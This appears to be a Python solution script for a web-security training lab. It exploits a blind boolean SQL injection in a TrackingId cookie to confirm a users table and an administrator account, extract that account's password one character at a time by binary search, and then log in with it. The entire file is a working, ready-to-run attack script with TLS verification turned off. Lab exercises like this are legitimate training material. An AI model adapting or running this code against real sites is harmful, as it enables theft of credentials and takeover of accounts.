import urllib3
import requests
from bs4 import BeautifulSoup
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

apostrophe = "'"
space = " "
equal = "="
where = "WHERE"
select = "SELECT"
aand = "AND"
froom = "FROM"
length = "LENGTH"
substring = "SUBSTRING"
one = "1"
username = "username"
password = "password"
administrator = "administrator"
success_message = "Welcome back"
table_name = "users"




def check_wrong_login(text):
    soup = BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else:
        error = None
    if error == "Invalid username or password.":
        return False
    return True


def csrf_getter(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]


def cookie_getter(session, url):
    resp = session.get(url, verify=False)
    traking_id = resp.cookies.get('TrackingId')
    session_tok = resp.cookies.get('session')
    return [traking_id , session_tok]


def vulnerability_checker(session,url,cookies) :
    cookie = {
        "TrackingId" : cookies[0],
        "session" : cookies[1]
    }

    payload = apostrophe + space + aand + space + apostrophe + one + apostrophe + equal + apostrophe + one

    cookie["TrackingId"] += payload
    
    print (f'Trying {cookie["TrackingId"]} ...')
    resp = session.get(url, cookies=cookie, verify=False)
    return success_message in resp.text


def verifying_table_name (session,url,cookies) :
    
    cookie = {
        "TrackingId" : cookies[0],
        "session" : cookies[1]
    }

    payload = apostrophe + space + aand + space + '(' + select + space + apostrophe + 'a' + apostrophe + space \
        + froom + space + table_name + space + "LIMIT" + space + one + ')' + equal + apostrophe + 'a'
    
    cookie["TrackingId"] += payload
    print (f'Trying {cookie["TrackingId"]} ...')
    resp = session.get(url, cookies=cookie, verify=False)

    return success_message in resp.text



def verifying_username (session,url,cookies) :
    
    cookie = {
        "TrackingId" : cookies[0],
        "session" : cookies[1]
    }

    payload = apostrophe + space + aand + space + '(' + select + space + apostrophe + 'a' + apostrophe + space \
        + froom + space + table_name + space + where + space + username + equal + apostrophe + administrator + apostrophe + ')' \
        + equal + apostrophe + 'a'
    
    cookie["TrackingId"] += payload
    print (f'Trying {cookie["TrackingId"]} ...')
    resp = session.get(url, cookies=cookie, verify=False)

    return success_message in resp.text


def length_of_password (session,url,cookies) :
   
    cookie = {
        "TrackingId" : cookies[0],
        "session" : cookies[1]
    }

    original_Id  = cookies[0]
    i = 1

    while True :
   
        payload = apostrophe + space + aand + space + '(' + select + space + apostrophe + 'a' + apostrophe + space \
            + froom + space + table_name + space + where + space + username + equal + apostrophe + administrator + apostrophe \
            + space + aand + space + length + '(' + password + ')' + '>' + str(i) + ')' + equal + apostrophe + 'a'
        
        cookie["TrackingId"] = original_Id + payload
        print (f'Trying {cookie["TrackingId"]} ...')
        
        resp = session.get(url, cookies=cookie, verify=False)
        if success_message  not in resp.text :
            return i
        i += 1



def determining_password (session,url,cookies,length) :
    
    cookie = {
        "TrackingId" : cookies[0],
        "session" : cookies[1]
    }

    original_Id  = cookies[0]
    safe_symbols = ''.join(c for c in string.punctuation if c not in "'\\\"")
    charset = sorted(string.ascii_lowercase + string.digits + string.ascii_uppercase + safe_symbols)
    result = ""

    for i in range (1,length+1) :
        lo, hi = 0 , len(charset) -1
        found_char = None
        
        while lo <= hi :
            
            mid = (lo + hi) // 2
            guess = charset[mid]
            cookie = {
                "TrackingId" : original_Id,
                "session" : cookies[1]
            }
            
            payload_gt = (apostrophe + space + aand + space + '(' + select + space + \
                substring + '(' + password + ',' + str(i) + ',' + one + ')' + space + froom + space + table_name + space + where + space + \
                username + equal + apostrophe + administrator + apostrophe + ')' +'>' + apostrophe + guess )
            
            cookie["TrackingId"] = original_Id + payload_gt
            print (f'Trying {cookie["TrackingId"]} ...')
            resp = session.get(url, cookies=cookie, verify=False)

            if success_message in resp.text :
                lo = mid + 1
            else :

                payload_eq = (apostrophe + space + aand + space + '(' + select + space + substring + '(' + password + ',' + str(i) + ',' + one + ')' +\
                    space + froom + space + table_name + space + where + space +\
                    username + equal + apostrophe + administrator + apostrophe + ')' + equal + apostrophe + guess )

                cookie["TrackingId"] = original_Id + payload_eq
                print (f'Trying {cookie["TrackingId"]} ...')
                resp = session.get(url, cookies=cookie, verify=False)

                if success_message in resp.text :
                    found_char = guess
                    break
                else :
                    hi = mid - 1

        if found_char is None :
            print(f'[!] Could not find char at position {i}, stopping.')
            break

        result += found_char
        print(f'[+] Position {i:02d}: {found_char}  →  {result}')

    return result

def main() :
    url = "https://0a3700da04f786f480378a4a00960067.web-security-academy.net"
    session = requests.Session()
    
    print("[*] Getting cookies...")
    cookies = cookie_getter(session, url)
    print(f"    TrackingId : {cookies[0]}")
    print(f"    session    : {cookies[1]}")

    
    print("\n[*] Checking vulnerability...")
    if not vulnerability_checker(session, url, cookies):
        print("[!] Target does not appear vulnerable. Exiting.")
        exit(1)
    print("[+] Vulnerable!\n")


    print("[*] Verifying table name...")
    if not verifying_table_name(session, url, cookies):
        print("[!] Table 'users' not found.")
        exit(1)
    print("[+] Table confirmed.\n")


    print("[*] Verifying username...")
    if not verifying_username(session, url, cookies):
        print("[!] User 'administrator' not found.")
        exit(1)
    print("[+] Username confirmed.\n")


    print("[*] Finding password length...")
    pwd_length = length_of_password(session, url, cookies)

    print(f"\n[*] Extracting password ({pwd_length} chars)...")
    pwd = determining_password(session, url, cookies, pwd_length)

    print(f"\n[✓] Password: {pwd}") 

    login_url = f'{url}/login'
    
    csrf = csrf_getter(session, login_url)
    creds = {"csrf": csrf, "username": "administrator", "password": pwd}
    r = session.post(login_url, data=creds, verify=False)
    
    if check_wrong_login(r.text):
        print("Koated !!")
    else:
        print("ya siks")

if __name__ == "__main__":
    main()        


    







            








    
    



        















